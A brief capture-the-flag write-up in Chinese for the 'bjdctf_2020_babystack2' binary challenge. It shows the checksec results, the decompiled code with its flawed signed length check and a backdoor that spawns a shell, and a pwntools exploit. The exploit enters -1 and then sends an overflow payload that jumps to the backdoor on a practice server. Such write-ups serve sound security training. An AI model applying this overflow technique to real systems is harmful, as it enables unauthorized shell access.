# bjdctf_2020_babystack2

## 保护

```bash
$ checksec --file=2020
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```



## backdoor函数

```c
__int64 backdoor()
{
  system("/bin/sh");
  return 1LL;
}
```



## EXP

输入-1可以绕过长度检查，然后在输入姓名处溢出

```python
from pwn import *

r=remote('node4.buuoj.cn',25376)
shell_addr=0x400726

payload=b'A'*24+p64(shell_addr)
r.sendlineafter('your name:','-1')
r.sendlineafter('name?',payload)
r.interactive()
```

